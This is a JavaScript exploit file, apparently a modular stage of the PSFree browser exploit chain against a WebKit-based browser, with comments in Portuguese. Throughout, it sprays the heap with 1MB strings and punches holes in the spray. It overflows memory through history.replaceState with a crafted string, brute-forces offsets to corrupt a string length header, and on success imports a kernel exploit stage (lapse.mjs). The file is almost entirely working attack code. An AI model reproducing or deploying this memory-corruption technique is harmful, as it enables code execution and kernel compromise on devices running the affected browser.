/* PSFree Modular: Smart Header Strike (Calculated Offset) */

import { Int } from './module/int64.mjs';
import { log, sleep } from './module/utils.mjs';

// --- CÁLCULO BASEADO NA ANÁLISE DO PSFREE ---
// Se acertamos dados em 709520, e o header inline do WebKit tem dados em +20 e length em +4...
// A diferença é 16 bytes.
const DATA_HIT_OFFSET = 709520;
const TARGET_HEADER_OFFSET = DATA_HIT_OFFSET - 16; // 709504

// Overflow suficiente para cobrir o objeto
const OVERFLOW_AMT = 1024 * 64; 

// Tamanho Vencedor (1MB TextDecoder)
const TARGET_SIZE = 1024 * 1024; 
const PAYLOAD_SIZE = TARGET_SIZE - 24; 

var victims = [];

async function main() {
    log("=== PSFree: Smart Header Strike ===");
    log(`Analise: Dados em ${DATA_HIT_OFFSET}. Tentando Length em ${TARGET_HEADER_OFFSET}...`);
    
    // Vamos tentar uma janela pequena ao redor do alvo calculado (709504)
    // Testamos: 709504, 709505, 709506, 709507... até 709512
    // Usamos precisão de 1 byte para não errar o alinhamento de 32-bit do Length
    
    let start = TARGET_HEADER_OFFSET;
    let end = TARGET_HEADER_OFFSET + 8;

    for (let off = start; off <= end; off++) {
        
        log(`\n[TESTE] Offset ${off}`);

        // Tenta 2 vezes por offset para estabilidade
        for(let retry=0; retry<2; retry++) {
            
            await prepare_heap();
            let result = await trigger_exploit(off);

            if (result === 'RCE') {
                log("!!! VENCEU !!! LENGTH CORROMPIDO!", 'green');
                log("Carregando Kernel Exploit...", 'green');
                await activate_stage2();
                return;
            }
            
            if (result === 'DATA') {
                log(`[INFO] Offset ${off} ainda pega DADOS.`, 'yellow');
                // Se ainda pega dados aqui, o header pode estar AINDA mais pra trás.
                // Mas vamos deixar o loop terminar.
            }
            
            victims = [];
            await forceGC();
        }
    }
    
    log("Fim do teste calculado.", 'red');
}

async function prepare_heap() {
    // 1. Criar Buffer 1MB
    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
    rawBuffer.fill(0x42); 
    let decoder = new TextDecoder("utf-8");
    let baseString = decoder.decode(rawBuffer);

    victims = [];
    const SPRAY_COUNT = 80;

    // 2. Spray
    for(let i=0; i<SPRAY_COUNT; i++) {
        let s = i + "_" + baseString.substring((i+"_").length);
        victims.push(s);
    }

    // 3. Buracos
    for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
    
    await forceGC();
}

async function trigger_exploit(offset) {
    try {
        let buffer = "A".repeat(offset);
        
        // TENTATIVA DE BYPASS DE HEADER:
        // Escrevemos 4 bytes de ZEROS (para pular Flags/RefCount no offset 0-3)
        // Depois mandamos 0x01 (para acertar Length no offset 4)
        buffer += "\u0000\u0000\u0000\u0000"; 
        
        buffer += "\x01".repeat(OVERFLOW_AMT);
        
        history.replaceState({}, "pwn", "/" + buffer);

        return check_corruption();

    } catch(e) {
        return 'ERR';
    }
}

function check_corruption() {
    for(let i=1; i<victims.length; i+=2) {
        let s = victims[i];
        if(!s) continue;
        try {
            let err = new Error(s);
            let msg = err.message;

            // SUCESSO (LENGTH)
            if (msg.length !== PAYLOAD_SIZE) {
                log(`!!! JACKPOT !!! String ${i} Length: ${msg.length}`, 'green');
                return 'RCE';
            }

            // DADOS
            if (msg.charCodeAt(0) !== 66) {
                return 'DATA';
            }
        } catch(e) {}
    }
    return null;
}

async function activate_stage2() {
    // Importa o Lapse para finalizar
    try {
        await import('./lapse.mjs');
    } catch(e) {
        log("Erro ao carregar Lapse: " + e.message);
    }
}

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 400));
}

main();
